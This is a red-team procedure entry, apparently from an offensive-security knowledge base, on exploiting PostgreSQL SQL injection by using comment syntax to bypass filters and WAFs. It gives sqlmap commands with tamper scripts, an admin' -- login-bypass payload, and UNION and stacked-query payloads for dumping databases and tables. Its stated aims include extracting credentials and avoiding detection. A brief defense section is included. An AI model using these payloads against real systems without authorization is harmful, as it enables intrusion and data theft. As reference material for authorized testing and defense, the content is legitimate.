---
id: 2f9fe46e-f4a7-44ef-a007-724c45a6a530
type: procedure
description: >-
  Exploit SQL injection vulnerabilities in PostgreSQL databases by using SQL
  comments to bypass filters and execute arbitrary queries.
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.373645+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - postgresql-injection
  - sql-injection
  - comments-bypass
commands:
  - '[[commands/sqlmap-postgresql-test]]'
platforms:
  - Web
  - Linux
tools:
  - '[[tools/sqlmap]]'
validated: true
---

# PostgreSQL-Injection-Using-Comments

## Summary

This procedure demonstrates how to exploit SQL injection vulnerabilities in web applications backed by PostgreSQL databases by leveraging SQL comments to bypass web application firewalls (WAFs) or input filters that block certain keywords, allowing the execution of arbitrary SQL commands for data extraction, modification, or privilege escalation.

## Description

PostgreSQL, a popular open-source relational database, is often the backend for web applications. SQL injection occurs when user input is improperly sanitized and concatenated into SQL queries, enabling attackers to alter query logic. This procedure focuses on using PostgreSQL's comment syntax (-- for single-line and /* */ for multi-line) to comment out portions of the original query, effectively bypassing filters that detect malicious patterns like 'OR 1=1--. For example, injecting ' -- comments out the rest of the query, turning a login check into a tautology. This technique is useful in scenarios where basic injections are blocked but comments are not filtered. It maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application) under tactics TA0001 (Initial Access) and TA0002 (Execution), potentially leading to data exfiltration or remote code execution if the database user has sufficient privileges.

## Requirements

1. Network access to a web application vulnerable to SQL injection (e.g., via HTTP/HTTPS).
2. Knowledge of the application's input points (e.g., login forms, search fields) that interact with a PostgreSQL backend.
3. Installed tools such as [[tools/sqlmap]] for automated testing or Burp Suite for manual interception.
4. Basic understanding of SQL syntax and PostgreSQL specifics, like comment handling.

## Defense

- Use parameterized queries or prepared statements to separate SQL code from user input.
- Implement web application firewalls (WAFs) with rules to detect and block comment-based injections, such as patterns matching -- or /* */ in inputs.
- Sanitize and validate all user inputs, escaping special characters and limiting database user privileges to read-only where possible.
- Enable PostgreSQL logging for failed queries and monitor for anomalous patterns like excessive comment usage.

## Objectives

1. Identify and confirm a SQL injection vulnerability in a PostgreSQL-backed application.
2. Bypass input filters using SQL comments to execute arbitrary queries.
3. Extract sensitive data, such as user credentials or database schema, or escalate to command execution.
4. Validate successful injection without alerting defensive mechanisms.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate a user input field (e.g., username in a login form) that is susceptible to SQL injection by testing for error messages or time-based delays indicative of PostgreSQL backend.

**Command** ([[commands/sqlmap-postgresql-test]]):
```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbms=postgresql --level=3 --risk=2
```

> This command uses SQLMap to probe the login endpoint, specifying PostgreSQL as the DBMS, with increased level and risk to test for injection points. Look for confirmation of injectable parameters in the output.

### Step 2: Test Basic Injection and Apply Comments

**Context**: Confirm injection by appending a single quote (') to cause a syntax error, then use comments to neutralize the query tail. For PostgreSQL, -- comments out the rest of the line, allowing bypass of filters blocking direct payloads.

Use the code snippet [[codes/PostgreSQL-Comment-Injection-Snippet]] inline here for crafting the payload:

```sql
username=admin' --
```

> Submit this via the form or tool. The -- comments out any subsequent conditions (e.g., AND password=...), bypassing authentication. Expected output: Successful login or data dump without errors.

### Step 3: Execute Arbitrary Query with Nested Comments

**Context**: Escalate to data extraction by injecting a full query, using nested comments (/* */) to evade WAFs that strip simple --. This step assumes the parameter is injectable and comments are unfiltered.

**Command** ([[commands/sqlmap-postgresql-test]]):
```bash
sqlmap -u "http://target.com/search" --data="q=$_PAYLOAD" --dbms=postgresql --dbs --tamper=space2comment
```

> Replace $_PAYLOAD with a commented injection like ' UNION SELECT version(); --. The --tamper script replaces spaces with comments for bypass. Expected output: List of databases if successful.

### Step 4: Verify and Extract Data

**Context**: Dump tables or users to confirm control, using comments to chain multiple statements if the backend allows.

**Command** ([[commands/sqlmap-postgresql-test]]):
```bash
sqlmap -u "http://target.com/login" --data="username=$_PAYLOAD&password=pass" --dbms=postgresql --tables -D users
```

> Use payload like admin'; SELECT table_name FROM information_schema.tables; --. Expected output: Table names from the 'users' database, indicating successful bypass and access.
